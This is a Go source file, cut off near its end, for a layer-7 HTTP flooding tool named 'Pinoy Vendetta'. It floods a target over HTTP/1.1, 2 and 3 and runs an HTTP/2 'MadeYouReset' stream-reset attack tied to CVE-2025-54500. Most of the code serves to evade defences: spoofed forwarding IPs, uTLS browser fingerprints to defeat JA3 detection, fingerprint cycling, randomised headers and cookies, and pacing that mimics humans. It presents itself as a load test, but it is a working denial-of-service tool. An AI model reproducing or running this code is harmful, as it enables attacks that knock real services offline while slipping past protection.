package main

import (
	"context"
	"crypto/rand"
	"crypto/tls"
	"errors"
	"flag"
	"fmt"
	"io"
	mathrand "math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/fatih/color"
	"github.com/quic-go/quic-go/http3"
	utls "github.com/refraction-networking/utls"
	"golang.org/x/net/http2"
)

// NOTE: This tool uses external libraries.
// Please initialize Go modules in your directory if you haven't already:
// 1. go mod init <your_project_name>
// 2. go mod tidy

const (
	maxAdaptiveDelay int64 = 8000 // Maximum adaptive delay in milliseconds (8 seconds)
)

var (
	requestsSent         uint64
	responsesRec         uint64
	logMessages          []string
	logMessagesMux       sync.Mutex
	statusCounts         = make(map[string]map[int]uint64) // Protocol -> StatusCode -> Count
	statusCountsMux      sync.Mutex
	currentDelay         int64
	totalLatency         int64
	errorTypes           = make(map[string]uint64)
	errorMux             sync.Mutex
	madeYouResetAttempts uint64
	madeYouResetSuccess  uint64
	madeYouResetErrors   uint64
)

var (
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0",
		"Mozilla/5.0 (Android 14; Mobile; rv:126.0) Gecko/126.0 Firefox/126.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.2535.67",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.2535.67",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/110.0.0.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/110.0.0.0",
		"Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36 SamsungBrowser/21.0",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
	}
	languages = []string{
		"en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9", "es-ES,es;q=0.9", "de-DE,de;q=0.9",
		"ja-JP,ja;q=0.9", "ko-KR,ko;q=0.9", "zh-CN,zh;q=0.8", "ru-RU,ru;q=0.7", "pt-BR,pt;q=0.7",
		"it-IT,it;q=0.6", "nl-NL,nl;q=0.5",
	}
	referers = []string{
		"https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/", "https://www.yahoo.com/",
		"https://www.baidu.com/", "https://www.yandex.ru/", "https://t.co/", "https://www.facebook.com/",
		"https://www.instagram.com/", "https://www.reddit.com/",
	}
	accepts         = []string{"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "application/json, text/plain, */*"}
	acceptEncodings = []string{"gzip, deflate, br", "gzip, deflate"}
	customHeaders   = []string{"X-Requested-With", "Cache-Control", "Pragma", "DNT", "X-Purpose", "Upgrade-Insecure-Requests"}
	cookieNames     = []string{"sessionid", "userid", "token", "visit", "pref"}
	contentTypes    = []string{"application/json", "application/x-www-form-urlencoded", "text/plain"}
	payloadFormats  = []string{"json", "form", "plain"}
)

var statusCodeDescriptions = map[int]string{
	100: "Continue", 101: "Switching Protocols", 102: "Processing", 103: "Early Hints",
	200: "OK", 201: "Created", 202: "Accepted", 203: "Non-Authoritative Information",
	204: "No Content", 205: "Reset Content", 206: "Partial Content", 207: "Multi-Status",
	208: "Already Reported", 218: "This is fine (Apache)", 226: "IM Used",
	300: "Multiple Choices", 301: "Moved Permanently", 302: "Found", 303: "See Other",
	304: "Not Modified", 305: "Use Proxy", 306: "Switch Proxy", 307: "Temporary Redirect", 308: "Permanent Redirect",
	400: "Bad Request", 401: "Unauthorized", 402: "Payment Required", 403: "Forbidden",
	404: "Not Found", 405: "Method Not Allowed", 406: "Not Acceptable", 407: "Proxy Authentication Required",
	408: "Request Timeout", 409: "Conflict", 410: "Gone", 411: "Length Required",
	412: "Precondition Failed", 413: "Payload Too Large", 414: "URI Too Long", 415: "Unsupported Media Type",
	416: "Range Not Satisfiable", 417: "Expectation Failed", 418: "I'm a teapot",
	419: "Page Expired (Laravel)", 420: "Enhance Your Calm (Twitter)", 421: "Misdirected Request",
	422: "Unprocessable Content", 423: "Locked", 424: "Failed Dependency", 425: "Too Early",
	426: "Upgrade Required", 428: "Precondition Required", 429: "Too Many Requests",
	430: "Request Header Fields Too Large (Shopify)", 431: "Request Header Fields Too Large",
	440: "Login Time-out (Microsoft)", 444: "No Response (Nginx)", 449: "Retry With (Microsoft)",
	450: "Blocked by Windows Parental Controls", 451: "Unavailable For Legal Reasons",
	460: "Client Closed Connection (AWS ELB)", 463: "X-Forwarded-For Too Large (AWS ELB)",
	494: "Request Header Too Large (Nginx)", 495: "SSL Certificate Error (Nginx)",
	496: "SSL Certificate Required (Nginx)", 497: "HTTP to HTTPS (Nginx)", 498: "Invalid Token (Esri)",
	499: "Client Closed Request (Nginx)",
	500: "Internal Server Error", 501: "Not Implemented", 502: "Bad Gateway", 503: "Service Unavailable",
	504: "Gateway Timeout", 505: "HTTP Version Not Supported", 506: "Variant Also Negotiates",
	507: "Insufficient Storage", 508: "Loop Detected", 509: "Bandwidth Limit Exceeded (cPanel)",
	510: "Not Extended", 511: "Network Authentication Required",
	520: "Unknown Error (Cloudflare)", 521: "Web Server Is Down (Cloudflare)",
	522: "Connection Timed Out (Cloudflare)", 523: "Origin Is Unreachable (Cloudflare)",
	524: "A Timeout Occurred (Cloudflare)", 525: "SSL Handshake Failed (Cloudflare)",
	526: "Invalid SSL Certificate (Cloudflare)", 527: "Railgun Error (Cloudflare)",
	529: "Site is overloaded", 530: "Site is frozen", 561: "Unauthorized (AWS ELB)",
	598: "Network Read Timeout Error", 599: "Network Connect Timeout Error",
}

var (
	titleColor      = color.New(color.FgHiCyan, color.Bold)
	headerColor     = color.New(color.FgYellow)
	valueColor      = color.New(color.FgGreen)
	statusOkColor   = color.New(color.FgGreen)
	statusWarnColor = color.New(color.FgYellow)
	statusErrColor  = color.New(color.FgRed)
)

func getRandomElement(slice []string) string {
	return slice[mathrand.Intn(len(slice))]
}

func getRandomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", mathrand.Intn(255)+1, mathrand.Intn(256), mathrand.Intn(256), mathrand.Intn(256))
}

func randomHeaderName(s string) string {
	var out strings.Builder
	for _, c := range s {
		if mathrand.Intn(2) == 0 {
			out.WriteString(strings.ToUpper(string(c)))
		} else {
			out.WriteString(strings.ToLower(string(c)))
		}
	}
	return out.String()
}

func generateRandomCookies() string {
	var cookies []string
	count := mathrand.Intn(3) + 1
	for i := 0; i < count; i++ {
		cookies = append(cookies, fmt.Sprintf("%s=%x", getRandomElement(cookieNames), mathrand.Intn(0xffffff)))
	}
	return strings.Join(cookies, "; ")
}

func generateRandomPayload(format string) (io.Reader, string) {
	switch format {
	case "json":
		body := fmt.Sprintf(`{"id":%d,"name":"user%d","random":"%x"}`, mathrand.Intn(1000), mathrand.Intn(1000), mathrand.Intn(0xffffff))
		return strings.NewReader(body), "application/json"
	case "form":
		body := fmt.Sprintf("id=%d&name=user%d&token=%x", mathrand.Intn(1000), mathrand.Intn(1000), mathrand.Intn(0xffffff))
		return strings.NewReader(body), "application/x-www-form-urlencoded"
	default:
		size := mathrand.Intn(1024*10) + 1024
		data := make([]byte, size)
		rand.Read(data)
		return strings.NewReader(string(data)), "text/plain"
	}
}

func randomPath(base string) string {
	parsed, _ := url.Parse(base)
	parsed.Path += "/" + fmt.Sprintf("%x", mathrand.Intn(0xfffff))
	q := parsed.Query()
	q.Set("v", fmt.Sprintf("%d", mathrand.Intn(99999)))
	parsed.RawQuery = q.Encode()
	return parsed.String()
}

func logMessage(msg string) {
	logMessagesMux.Lock()
	defer logMessagesMux.Unlock()
	logMessages = append(logMessages, time.Now().Format("15:04:05")+" "+msg)
	// MODIFIED: Changed log length from 5 to 3.
	if len(logMessages) > 3 {
		logMessages = logMessages[len(logMessages)-3:]
	}
}

func recordError(errType string) {
	errorMux.Lock()
	defer errorMux.Unlock()
	errorTypes[errType]++
}

func detectSupportedHTTPVersions(target string, insecureTLS bool) []string {
	supportedVersionsSet := make(map[string]struct{})
	parsed, err := url.Parse(target)
	if err != nil {
		return []string{"1.1"}
	}
	host := parsed.Hostname()
	userAgent := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

	// --- HTTP/3 Check ---
	h3RoundTripper := &http3.RoundTripper{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: insecureTLS, ServerName: host},
	}
	h3Client := &http.Client{Transport: h3RoundTripper, Timeout: 3 * time.Second}
	reqH3, _ := http.NewRequest("HEAD", target, nil)
	reqH3.Header.Set("User-Agent", userAgent)
	respH3, errH3 := h3Client.Do(reqH3)
	if errH3 == nil && respH3 != nil {
		if respH3.ProtoMajor == 3 {
			supportedVersionsSet["3"] = struct{}{}
		}
		respH3.Body.Close()
	}
	h3RoundTripper.Close()

	// --- HTTP/2 Check ---
	h2Transport := &http2.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: insecureTLS, ServerName: host},
	}
	h2Client := &http.Client{Transport: h2Transport, Timeout: 3 * time.Second}
	reqH2, _ := http.NewRequest("HEAD", target, nil)
	reqH2.Header.Set("User-Agent", userAgent)
	respH2, errH2 := h2Client.Do(reqH2)
	if errH2 == nil && respH2 != nil {
		if respH2.ProtoMajor == 2 {
			supportedVersionsSet["2"] = struct{}{}
		}
		respH2.Body.Close()
	}

	// --- HTTP/1.1 Check ---
	h1Transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: insecureTLS, ServerName: host},
		TLSNextProto:    make(map[string]func(string, *tls.Conn) http.RoundTripper),
	}
	h1Client := &http.Client{Transport: h1Transport, Timeout: 3 * time.Second}
	reqH1, _ := http.NewRequest("HEAD", target, nil)
	reqH1.Header.Set("User-Agent", userAgent)
	respH1, errH1 := h1Client.Do(reqH1)
	if errH1 == nil && respH1 != nil {
		if respH1.ProtoMajor == 1 && respH1.ProtoMinor == 1 {
			supportedVersionsSet["1.1"] = struct{}{}
		}
		respH1.Body.Close()
	}

	if len(supportedVersionsSet) == 0 {
		return []string{"1.1"}
	}
	result := make([]string, 0, len(supportedVersionsSet))
	for v := range supportedVersionsSet {
		result = append(result, v)
	}
	sort.Strings(result)
	return result
}

// MODIFIED: Reworked the "MadeYouReset" attack to align with the NodeJS reference (CVE-2025-54500).
// This method now attempts to trigger a server-side RST_STREAM by sending a POST request,
// aiming to violate protocol rules. A success is recorded when the server resets the stream,
// which is detected as an http2.StreamError on the client side.
func madeYouResetAttack(parentCtx context.Context, config *workerConfig, client *http.Client) {
	select {
	case <-parentCtx.Done():
		return
	default:
	}

	format := getRandomElement(payloadFormats)
	body, contentType := generateRandomPayload(format)
	req, err := http.NewRequestWithContext(parentCtx, "POST", config.targetURL, body)
	if err != nil {
		return // Cannot create request, do nothing.
	}
	req.Header.Set("User-Agent", getRandomElement(userAgents))
	req.Header.Set("Cache-Control", "no-store")
	req.Header.Set("Content-Type", contentType)

	atomic.AddUint64(&requestsSent, 1)
	atomic.AddUint64(&madeYouResetAttempts, 1)
	resp, err := client.Do(req)

	if err != nil {
		var streamErr http2.StreamError
		// errors.As checks if the error is or wraps an http2.StreamError. This indicates a server-side reset.
		if errors.As(err, &streamErr) {
			// SUCCESS: The server sent RST_STREAM. This is the intended outcome.
			atomic.AddUint64(&madeYouResetSuccess, 1)
			logMessage(statusOkColor.Sprintf("[H2-RESET] Success (Server Reset Stream)"))
		} else if err != context.Canceled {
			// This is an unexpected network or client error.
			atomic.AddUint64(&madeYouResetErrors, 1)
			logMessage(statusErrColor.Sprintf("[H2-RESET] Network Error: %v", err))
		}
		// context.Canceled errors are ignored as they typically mean the test is ending.
	} else if resp != nil {
		// A response was received, which is not a successful reset attack.
		// We still process it to record the status code for diagnostics.
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		atomic.AddUint64(&responsesRec, 1)
		statusCountsMux.Lock()
		if _, ok := statusCounts["2"]; !ok { // Hardcode "2" for H2 reset attack
			statusCounts["2"] = make(map[int]uint64)
		}
		statusCounts["2"][resp.StatusCode]++
		statusCountsMux.Unlock()
	}
}

// ENHANCEMENT: Create a custom Dial function that uses uTLS to bypass JA3 fingerprinting.
func buildUTLSConn(insecureTLS bool, sni string) func(ctx context.Context, network, addr string) (net.Conn, error) {
	return func(ctx context.Context, network, addr string) (net.Conn, error) {
		dialer := &net.Dialer{Timeout: 30 * time.Second, KeepAlive: 30 * time.Second}
		conn, err := dialer.DialContext(ctx, network, addr)
		if err != nil {
			return nil, err
		}

		uTlsConfig := &utls.Config{
			ServerName:         sni,
			InsecureSkipVerify: insecureTLS,
		}

		// Randomly select a browser fingerprint to impersonate.
		var clientHello utls.ClientHelloID
		switch mathrand.Intn(4) {
		case 0:
			clientHello = utls.HelloChrome_120
		case 1:
			clientHello = utls.HelloFirefox_120
		case 2:
			// FIXED: Replaced undefined HelloIOS_17 with a more common and stable fingerprint.
			clientHello = utls.HelloSafari_16_0
		default:
			clientHello = utls.HelloRandomized
		}

		uconn := utls.UClient(conn, uTlsConfig, clientHello)
		if err := uconn.HandshakeContext(ctx); err != nil {
			conn.Close()
			return nil, err
		}
		return uconn, nil
	}
}

// FIXED: Corrected HTTP/1.1 client creation to prevent handshake errors.
func buildHTTPClient(config *workerConfig, httpVersion string) *http.Client {
	sni := randomSNI(config.targetURL)
	// This custom dialer performs the TCP dial and the full TLS handshake.
	dialer := buildUTLSConn(config.insecureTLS, sni)

	if httpVersion == "2" {
		h2Transport := &http2.Transport{
			// http2.Transport requires a connection that has already completed the TLS handshake.
			DialTLSContext: func(ctx context.Context, network, addr string, _ *tls.Config) (net.Conn, error) {
				return dialer(ctx, network, addr)
			},
		}
		return &http.Client{Transport: h2Transport, Timeout: 30 * time.Second}
	}

	// For HTTP/1.1, we must also use DialTLSContext. Using the older DialContext would
	// cause the http.Transport to attempt a second, failing handshake over the already-encrypted stream.
	transport := &http.Transport{
		Proxy: http.ProxyFromEnvironment,
		// CORRECT: Use DialTLSContext because our dialer provides a connection that has already been handshaked.
		DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
			return dialer(ctx, network, addr)
		},
		MaxIdleConns:          100,
		IdleConnTimeout:       90 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
		// This is crucial: it disables ALPN, which prevents the connection from upgrading to HTTP/2, forcing HTTP/1.1.
		TLSNextProto: make(map[string]func(string, *tls.Conn) http.RoundTripper),
	}
	return &http.Client{Transport: transport, Timeout: 30 * time.Second}
}

func buildHTTP3Client(config *workerConfig) *http.Client {
	// uTLS is harder to integrate directly with QUIC, so we use standard TLS for H3
	// but can still randomize other aspects like SNI.
	return &http.Client{
		Transport: &http3.RoundTripper{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: config.insecureTLS, ServerName: randomSNI(config.targetURL)},
			DisableCompression: false,
		},
		Timeout: 30 * time.Second,
	}
}

func randomSNI(rawURL string) string {
	parsed, err := url.Parse(rawURL)
	if err != nil || !strings.Contains(parsed.Host, ".") {
		return ""
	}
	host := parsed.Hostname()
	if mathrand.Intn(3) == 0 {
		return fmt.Sprintf("%x.%s", mathrand.Intn(0xfffff), host)
	}
	return host
}

func isTransientErr(err error) bool {
	return strings.Contains(err.Error(), "timeout") || strings.Contains(err.Error(), "connection reset")
}

type workerConfig struct {
	targetURL         string
	methods           []string
	ipRandom          bool
	pathRandom        bool
	retry             bool
	burst             bool
	burstSize         int
	jitterMs          int
	insecureTLS       bool
	supportedVersions []string
	adaptiveDelay     bool
	thinkTimeMs       int
}

func worker(ctx context.Context, wg *sync.WaitGroup, config *workerConfig, httpVersion string) {
	defer func() {
		if r := recover(); r != nil {
			logMessage(fmt.Sprintf("[PANIC] Worker %s recovered: %v", httpVersion, r))
		}
		wg.Done()
	}()

	var client *http.Client
	var burstsSinceLastCycle int
	// ENHANCEMENT: Cycle client to get new connection, new source port, and new JA3 fingerprint.
	const clientCycleThreshold = 50 // Recreate the client every 50 bursts.

	// Initial client creation
	if httpVersion == "3" {
		client = buildHTTP3Client(config)
	} else {
		client = buildHTTPClient(config, httpVersion)
	}

	if httpVersion == "2" {
		go func() {
			ticker := time.NewTicker(time.Duration(100+mathrand.Intn(200)) * time.Millisecond)
			defer ticker.Stop()
			for {
				select {
				case <-ctx.Done():
					return
				case <-ticker.C:
					// Run N attacks in a tight loop to increase pressure.
					for i := 0; i < 3+mathrand.Intn(5); i++ {
						madeYouResetAttack(ctx, config, client)
					}
				}
			}
		}()
	}

	for {
		// --- Client Cycling Logic ---
		if burstsSinceLastCycle > clientCycleThreshold {
			// Close idle connections of the old client
			if transport, ok := client.Transport.(interface{ CloseIdleConnections() }); ok {
				transport.CloseIdleConnections()
			}
			// Create a new client
			if httpVersion == "3" {
				client = buildHTTP3Client(config)
			} else {
				client = buildHTTPClient(config, httpVersion)
			}
			burstsSinceLastCycle = 0
			logMessage(fmt.Sprintf("[H%s] Client cycled (new JA3/H2 fingerprint)", httpVersion))
		}

		// 1. Burst Phase
		var burstCount int
		if config.burst {
			burstCount = 1 + mathrand.Intn(config.burstSize)
		} else {
			burstCount = 1
		}

		for i := 0; i < burstCount; i++ {
			select {
			case <-ctx.Done():
				return
			default:
				method := getRandomElement(config.methods)
				var reqURL string = config.targetURL
				if config.pathRandom {
					reqURL = randomPath(config.targetURL)
				}
				var payload io.Reader = nil
				contentType := ""
				if method == "POST" || method == "PUT" || method == "PATCH" {
					format := getRandomElement(payloadFormats)
					payload, contentType = generateRandomPayload(format)
				}

				req, err := http.NewRequestWithContext(ctx, method, reqURL, payload)
				if err != nil {
					recordError("req_create_error")
					continue
				}

				headerSet := map[string]string{
					randomHeaderName("User-Agent"):      getRandomElement(userAgents),
					randomHeaderName("Accept-Language"): getRandomElement(languages),
					randomHeaderName("Referer"):         getRandomElement(referers),
					randomHeaderName("Accept"):          getRandomElement(accepts),
					randomHeaderName("Accept-Encoding"): getRandomElement(acceptEncodings),
					randomHeaderName("Connection"):      "keep-alive",
					randomHeaderName("Cookie"):          generateRandomCookies(),
				}
				if contentType != "" {
					headerSet[randomHeaderName("Content-Type")] = contentType
				}
				if config.ipRandom {
					ip := getRandomIP()
					headerSet[randomHeaderName("X-Forwarded-For")] = ip
					headerSet[randomHeaderName("X-Real-IP")] = ip
				}
				for _, h := range customHeaders {
					headerSet[randomHeaderName(h)] = getRandomElement([]string{"1", "no-cache", "XMLHttpRequest", "on", "off"})
				}
				keys := make([]string, 0, len(headerSet))
				for k := range headerSet {
					keys = append(keys, k)
				}
				mathrand.Shuffle(len(keys), func(i, j int) { keys[i], keys[j] = keys[j], keys[i] })
				for _, k := range keys {
					req.Header.Set(k, headerSet[k])
				}

				atomic.AddUint64(&requestsSent, 1)
				start := time.Now()
				resp, err := client.Do(req)
				latency := time.Since(start).Milliseconds()
				atomic.AddInt64(&totalLatency, latency)

				if err != nil {
					if err != context.Canceled {
						logMessage(fmt.Sprintf("[H%s] Client Error: %v", httpVersion, err))
						recordError("client_error")
					}
					if config.retry && isTransientErr(err) {
						time.Sleep(50 * time.Millisecond)
					}
					if config.adaptiveDelay {
						var delayToAdd int64
						if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
							delayToAdd = 150
						} else if strings.Contains(err.Error(), "connection reset") {
							delayToAdd = 150
						}
						if delayToAdd > 0 {
							newDelay := atomic.AddInt64(&currentDelay, delayToAdd)
							if newDelay > maxAdaptiveDelay {
								atomic.StoreInt64(&currentDelay, maxAdaptiveDelay)
							}
						}
					}
					continue
				}

				io.Copy(io.Discard, resp.Body)
				resp.Body.Close()
				atomic.AddUint64(&responsesRec, 1)

				statusCountsMux.Lock()
				if _, ok := statusCounts[httpVersion]; !ok {
					statusCounts[httpVersion] = make(map[int]uint64)
				}
				statusCounts[httpVersion][resp.StatusCode]++
				statusCountsMux.Unlock()

				if config.adaptiveDelay {
					var delayToAdd int64 = 0
					switch resp.StatusCode {
					case 401, 403, 429, 430, 431, 451, 460, 463, 494, 499:
						delayToAdd = 150
					case 400, 406, 410, 412, 417, 421, 422, 423:
						delayToAdd = 75
					case 413, 444:
						delayToAdd = 50
					}
					if delayToAdd > 0 {
						newDelay := atomic.AddInt64(&currentDelay, delayToAdd)
						if newDelay > maxAdaptiveDelay {
							atomic.StoreInt64(&currentDelay, maxAdaptiveDelay)
						}
					}
				}
				statusText, ok := statusCodeDescriptions[resp.StatusCode]
				if !ok {
					statusText = "Unknown"
				}
				logMessage(fmt.Sprintf("[H%s] %s -> %d %s (%dms)", httpVersion, reqURL, resp.StatusCode, statusText, latency))

				// ENHANCEMENT: Add a small "pacing" delay within a burst to seem more human.
				if i < burstCount-1 { // Don't sleep after the last request in the burst
					pacingDelay := time.Duration(50+mathrand.Intn(200)) * time.Millisecond
					time.Sleep(pacingDelay)
				}
			}
		}

		burstsSinceLastCycle++

		// 2. Think Time Phase
		var baseDelay int64
		if config.adaptiveDelay {
			baseDelay = atomic.LoadInt64(&currentDelay)
		}
		thinkTime := mathrand.Int63n(int64(config.thinkTimeMs))
		jitter := mathrand.Int63n(int64(config.jitterMs))

		time.Sleep(time.Duration(baseDelay+thinkTime+jitter) * time.Millisecond)
	}
}

func monitor(ctx context.Context, duration time.Duration, config *workerConfig) {
	startTime := time.Now()
	endTime := startTime.Add(duration)
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()
	fmt.Print("\033[H\033[J")

	for {
		select {
		case <-ctx.Done():
			printProgress(endTime, startTime, config)
			fmt.Println("\n\nLoad test finished.")
			return
		case <-ticker.C:
			printProgress(endTime, startTime, config)
			if config.adaptiveDelay {
				current := atomic.LoadInt64(&currentDelay)
				if current > 0 {
					newDelay := int64(float64(current) * 0.92)
					atomic.StoreInt64(&currentDelay, newDelay)
				}
			}
		}
	}
}

var ansiRegex = regexp.MustCompile("[\u001B\u009B][[\\]()#;?]*(?:(?:[a-zA-Z\\d]*(?:;[a-zA-Z\\d]*)*)?\u0007|(?:\u001B\\[)?[0-9;=?>!]*[ -/]*[@-~])")

func stripAnsi(str string) string {
	return ansiRegex.ReplaceAllString(str, "")
}

func printProgress(endTime, startTime time.Time, config *workerConfig) {
	var sb strings.Builder
	sb.WriteString("\033[H\033[J")
	remaining := time.Until(endTime)
	if remaining < 0 {
		remaining = 0
	}
	elapsed := time.Since(startTime)
	reqSent := atomic.LoadUint64(&requestsSent)
	resRec := atomic.LoadUint64(&responsesRec)
	var rps float64
	if elapsed.Seconds() > 0 {
		rps = float64(reqSent) / elapsed.Seconds()
	}
	var avgLatency float64
	if resRec > 0 {
		avgLatency = float64(atomic.LoadInt64(&totalLatency)) / float64(resRec)
	}

	sb.WriteString(titleColor.Sprint("--- Pinoy Vendetta Layer 7 (Multi-Protocol, Evasive, Distributed-Ready) ---\n"))
	sb.WriteString(headerColor.Sprint("---------------------------------------------------------------------------------------------------------------------------------------------------------------\n"))

	left := []string{
		fmt.Sprintf("%-25s %s", "Random UA:", statusString(true)),
		fmt.Sprintf("%-25s %s", "Random IP:", statusString(config.ipRandom)),
		fmt.Sprintf("%-25s %s", "Random Paths:", statusString(config.pathRandom)),
		fmt.Sprintf("%-25s %s", "Burst & Think Mode:", statusString(config.burst)),
		fmt.Sprintf("%-25s %s", "Retry on Error:", statusString(config.retry)),
		fmt.Sprintf("%-25s %s", "Adaptive Delay:", statusString(config.adaptiveDelay)),
	}
	isH2Active := false
	for _, v := range config.supportedVersions {
		if v == "2" {
			isH2Active = true
			break
		}
	}
	left = append(left, fmt.Sprintf("%-25s %s", "H2 MadeYouReset Attack:", statusString(isH2Active)))
	left = append(left, fmt.Sprintf("%-25s %s", "JA3 Fingerprint Evasion:", valueColor.Sprint("Enabled")))

	right := []string{
		fmt.Sprintf("%-18s %s", "Time Remaining:", remaining.Round(time.Second)),
		fmt.Sprintf("%-18s %d", "Requests Sent:", reqSent),
		fmt.Sprintf("%-18s %d", "Responses Recv:", resRec),
		fmt.Sprintf("%-18s %.2f", "Reqs/Second:", rps),
		fmt.Sprintf("%-18s %.2fms", "Avg Latency:", avgLatency),
		fmt.Sprintf("%-18s %dms", "Adaptive Delay:", atomic.LoadInt64(&currentDelay)),
		fmt.Sprintf("%-18s %s", "Target:", config.targetURL),
		fmt.Sprintf("%-18s %s", "Active Versions:", valueColor.Sprint(strings.Join(config.supportedVersions, ", "))),
	}
	maxRows := len(left)
	if len(right) > maxRows {
		maxRows = len(right)
	}
	rightColStart := 85
	for i := 0; i < maxRows; i++ {
		leftStr := ""
		rightStr := ""
		if i < len(left) {
			leftStr = left[i]
		}
		if i < len(right) {
			rightStr = right[i]
		}
		sb.WriteString(leftStr)
		sb.WriteString(strings.Repeat(" ", rightColStart-len(leftStr)))
		sb.WriteString(rightStr)
		sb.WriteString("\n")
	}

	sb.WriteString(headerColor.Sprint("---------------------------------------------------------------------------------------------------------------------------------------------------------------\n"))
	sb.WriteString(headerColor.Sprint("Response Status Counts:\n"))

	statusCountsMux.Lock()
	// Prepare data for each column
	protocols := []string{"1.1", "2", "3"}
	protocolData := make(map[string][]string)
	maxStatusRows := 0

	for _, p := range protocols {
		var lines []string
		if protoMap, ok := statusCounts[p]; ok {
			codes := make([]int, 0, len(protoMap))
			for code := range protoMap {
				codes = append(codes, code)
			}
			sort.Ints(codes)

			for _, code := range codes {
				count := protoMap[code]
				statusText, _ := statusCodeDescriptions[code]
				var statusColor *color.Color
				if code >= 200 && code < 300 {
					statusColor = statusOkColor
				} else if code >= 400 && code < 500 {
					statusColor = statusWarnColor
				} else {
					statusColor = statusErrColor
				}
				lines = append(lines, statusColor.Sprintf("  %d (%s): %d", code, statusText, count))
			}
		}
		protocolData[p] = lines
		if len(lines) > maxStatusRows {
			maxStatusRows = len(lines)
		}
	}
	statusCountsMux.Unlock()

	// Print headers
	headers := map[string]string{"1.1": "H1.1:", "2": "H2:", "3": "H3:"}
	colWidth := 50
	headerLine := ""
	for _, p := range protocols {
		headerLine += fmt.Sprintf("%-*s", colWidth, headers[p])
	}
	sb.WriteString(headerColor.Sprint(headerLine + "\n"))

	// Print rows
	for i := 0; i < maxStatusRows; i++ {
		rowLine := ""
		for _, p := range protocols {
			line := ""
			if i < len(protocolData[p]) {
				line = protocolData[p][i]
			}
			padding := colWidth - len(stripAnsi(line))
			if padding < 0 {
				padding = 0
			}
			rowLine += line + strings.Repeat(" ", padding)
		}
		sb.WriteString(rowLine + "\n")
	}

	errorMux.Lock()
	if len(errorTypes) > 0 {
		sb.WriteString(headerColor.Sprint("Error Types:\n"))
		errKeys := make([]string, 0, len(errorTypes))
		for k := range errorTypes {
			errKeys = append(errKeys, k)
		}
		sort.Strings(errKeys)
		for _, k := range errKeys {
			v := errorTypes[k]
			sb.WriteString(statusErrColor.Sprintf("  %s: %d\n", k, v))
		}
	}
	errorMux.Unlock()

	// Add MadeYouReset stats
	if isH2Active {
		attempts := atomic.LoadUint64(&madeYouResetAttempts)
		success := atomic.LoadUint64(&madeYouResetSuccess)
		errors := atomic.LoadUint64(&madeYouResetErrors)

		sb.WriteString(headerColor.Sprint("H2 MadeYouReset Attack Stats:\n"))
		sb.WriteString(fmt.Sprintf("  %-20s %d\n", "Attempts:", attempts))
